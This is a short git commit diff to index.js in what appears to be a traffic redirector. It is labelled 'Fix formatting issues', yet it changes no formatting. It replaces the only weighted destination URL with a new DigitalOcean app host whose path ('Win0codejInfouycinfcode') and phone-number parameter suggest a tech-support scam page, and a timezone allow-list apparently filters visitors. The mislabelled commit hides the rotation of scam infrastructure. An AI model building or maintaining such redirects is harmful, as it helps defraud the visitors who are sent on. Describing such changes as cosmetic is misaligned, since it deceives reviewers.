25a0a96c2d00fb6f6e3d4897b7b58ade4248b970
paalakash <palaksh452@gmail.com>
2026-06-20 07:29:43 +0530

    Fix formatting issues in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://coral-app-5opqx.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-414-5328", weight: 1.0 }
+    { url: "https://lionfish-app-8t85k.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-414-5328", weight: 1.0 }
 
 ];
 
